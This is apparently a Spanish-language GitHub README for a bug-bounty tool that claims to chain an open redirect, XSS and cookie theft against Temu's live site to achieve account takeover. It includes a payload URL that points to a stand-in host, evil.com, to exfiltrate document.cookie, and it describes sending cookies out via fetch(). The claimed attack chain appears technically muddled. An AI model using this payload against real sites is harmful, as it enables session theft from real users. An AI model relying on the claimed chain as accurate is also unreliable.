# 🚨 temu-vuln-hunter-pro

Herramienta profesional para la detección y explotación automatizada de vulnerabilidades encadenadas en el dominio de Temu (https://www.temu.com), incluyendo:

- ✅ Open Redirect
- ✅ XSS reflejado
- ✅ Robo de cookies
- ✅ Toma de control de cuenta (Account Takeover)
- ✅ CSRF / IDOR (en desarrollo)

> 🎯 Proyecto creado para propósitos educativos, pruebas éticas y programas de bug bounty como HackerOne.

---

## 📌 Descripción

`temu-vuln-hunter-pro` automatiza la explotación de flujos críticos en Temu, encadenando vulnerabilidades como redirección abierta y ejecución de JavaScript malicioso para obtener cookies de sesión y simular toma de cuenta.

Incluye:

- Scripts de explotación (`exploit_xss_redirect.py`)
- Pruebas de PoC (`poc.html`, `xss.js`)
- Documentación del ataque
- Capturas e informes listos para HackerOne

---

## 🧪 Ejemplo de Payload Usado

```bash
https://www.temu.com/track?redirect=https://evil.com/xss.js?cookie=document.cookie

Este payload aprovecha la redirección para ejecutar un XSS almacenado o reflejado desde el dominio del atacante, permitiendo robar document.cookie y reenviarla vía fetch().

🧩 Encadenamiento de vulnerabilidades

🌀 Open Redirect: permite redirigir al usuario a un dominio externo malicioso.

🧠 Reflected XSS: el atacante controla el JS cargado.

🍪 Cookie Theft: el script roba cookies de sesión (document.cookie) y las envía a un servidor del atacante.

🔓 Account Takeover: al capturar la cookie de sesión, el atacante puede suplantar al usuario.

📂 Estructura del proyecto
Copiar
Editar
temu-vuln-hunter-pro/
├── README.md
├── exploit_xss_redirect.py
├── poc/
│   ├── xss.js
│   ├── poc.html
├── docs/
│   └── vulnerability_report.md
└── evidence/
    └── screenshot.png

💻 Requisitos
Python 3.8+

Navegador (para ejecutar poc.html)

Servidor HTTP local (opcional para pruebas de xss.js)

Instalación rápida:

bash
Copiar
Editar
git clone https://github.com/Jonathanjimenez123/temu-vuln-hunter-pro.git
cd temu-vuln-hunter-pro
python3 exploit_xss_redirect.py

📸 Capturas
Ataque en acción	Cookie interceptada
cf_clearance=abc123; sid=xyz456...

🛡️ Propósito ético
Este proyecto se realiza exclusivamente con fines educativos y de investigación. Su objetivo es demostrar la cadena de vulnerabilidades reales que podrían existir en plataformas como Temu y ayudar a mitigarlas. No debe ser utilizado en entornos no autorizados.

📬 Reporte en HackerOne
Alias: jimenez7@wearehackerone.com

Encabezado HTTP: X-HackerOne-Investigación: jimenez7

Informe profesional: Ver docs/vulnerability_report.md

PoC en vivo: Ver carpeta /poc

✍️ Autor
Jonathan Jiménez
GitHub: @Jonathanjimenez123
Bug Bounty Hunter | Ethical Hacker | Python Developer

📄 Licencia
Este proyecto está bajo la licencia MIT.
